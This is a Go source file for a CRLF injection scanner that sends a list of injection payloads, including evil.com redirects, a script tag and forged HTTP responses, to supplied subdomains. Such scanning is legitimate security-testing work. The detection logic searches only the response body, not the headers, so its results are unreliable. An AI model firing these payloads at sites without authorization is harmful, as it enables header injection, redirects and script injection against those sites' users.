package scanner

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/fatih/color"
)

// ScanCRLF checks for CRLF injection vulnerabilities in the provided subdomains.
func ScanCRLF(subdomains []string) {
	// Display the name tag for the scan type with colors
	banner := color.New(color.FgCyan).SprintFunc()
	success := color.New(color.FgGreen).SprintFunc()
	errorMsg := color.New(color.FgRed).SprintFunc()

	fmt.Println(banner("==================================="))
	fmt.Println(success("         CRLF Injection Scan       "))
	fmt.Println(banner("==================================="))

	outputDir := "./output/crlf"
	err := os.MkdirAll(outputDir, os.ModePerm)
	if err != nil {
		fmt.Println(errorMsg("Error creating output directory:"), err)
		return
	}

	// Define enhanced payloads for CRLF injection testing
	payloads := []string{
		"%0d%0aSet-Cookie:crlf_injected=true",            // Inject a new header
		"%0d%0aContent-Length:0",                         // Break the response
		"%0d%0aX-Custom-Header:Injected",                 // Add a custom header
		"%0a%20",                                         // Line feed with space
		"%0d%0a%09",                                      // Carriage return, line feed, and tab
		"%23%0d%0a",                                      // URL-encoded hash with CRLF
		"%e5%98%8a%e5%98%8d%0d%0a",                       // Unicode characters with CRLF
		"%u000d%u000a",                                   // Unicode CRLF
		"\\r\\n",                                         // Literal CRLF
		"%0d%0aLocation:%20https://evil.com",             // Redirect to a malicious site
		"%0d%0aRefresh:%205;url=https://evil.com",        // Inject a refresh header
		"%0d%0aContent-Disposition:%20attachment",        // Inject a content-disposition header
		"%0d%0a<script>alert('Injected')</script>",       // Inject a script tag
		"%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a",          // Inject a fake HTTP response
		"%0d%0a%0d%0a<html><body>Injected</body></html>", // Inject HTML content
		"%0d%0aX-Injected-Header:%20test",                // Inject a custom header
		"%0d%0a%0d%0a{\"injected\":\"json\"}",            // Inject JSON content
		"%0d%0a%0d%0a{\"status\":\"200 OK\"}",            // Inject a fake JSON response
		"%0d%0a%0d%0a{\"error\":\"CRLF Injection\"}",     // Inject an error message
	}

	// Open a file to save the results
	resultsFile := filepath.Join(outputDir, "crlf_vulnerabilities.txt")
	results, err := os.OpenFile(resultsFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(errorMsg("Error creating results file:"), err)
		return
	}
	defer results.Close()

	// Write the banner to the file
	bannerText := "===================================\n         CRLF Injection Scan       \n===================================\n\n"
	_, err = results.WriteString(bannerText)
	if err != nil {
		fmt.Printf(errorMsg("Error writing banner to results file: %v\n"), err)
		return
	}

	// Iterate over each subdomain
	for _, subdomain := range subdomains {
		// Ensure the URL has a valid scheme
		var baseURL string
		if strings.HasPrefix(subdomain, "http://") || strings.HasPrefix(subdomain, "https://") {
			baseURL = subdomain
		} else {
			baseURL = fmt.Sprintf("http://%s", subdomain)
		}

		fmt.Printf(color.YellowString("Scanning %s for CRLF injection vulnerabilities...\n"), baseURL)

		// Collect findings for the subdomain
		var findings []string

		for _, payload := range payloads {
			// Construct the URL with the payload
			testURL := fmt.Sprintf("%s?test=%s", baseURL, payload)

			// Perform the HTTP request
			client := &http.Client{Timeout: 30 * time.Second} // Increase timeout to 30 seconds
			resp, err := client.Get(testURL)
			if err != nil {
				fmt.Printf(errorMsg("Error accessing %s with payload %s: %v\n"), testURL, payload, err)
				continue
			}

			// Ensure the response body is closed
			defer resp.Body.Close()

			// Analyze the response body and headers for signs of injection
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				fmt.Printf(errorMsg("Error reading response body from %s: %v\n"), testURL, err)
				continue
			}

			// Check for injected headers or patterns in the response
			if strings.Contains(string(body), "crlf_injected=true") ||
				strings.Contains(string(body), "X-Custom-Header:Injected") ||
				strings.Contains(string(body), payload) {
				findings = append(findings, fmt.Sprintf(
					"Vulnerable URL: %s\n  Payload: %s\n  Response contains injected content.\n",
					testURL, payload,
				))
			}
		}

		// Write findings for the subdomain to the file
		if len(findings) > 0 {
			_, err := results.WriteString(fmt.Sprintf("Findings for %s:\n%s\n=========================\n", baseURL, strings.Join(findings, "\n")))
			if err != nil {
				fmt.Printf(errorMsg("Error writing findings to results file: %v\n"), err)
			}
		}
	}
	fmt.Println(success("CRLF injection scan completed. Results saved to:"), resultsFile)
}
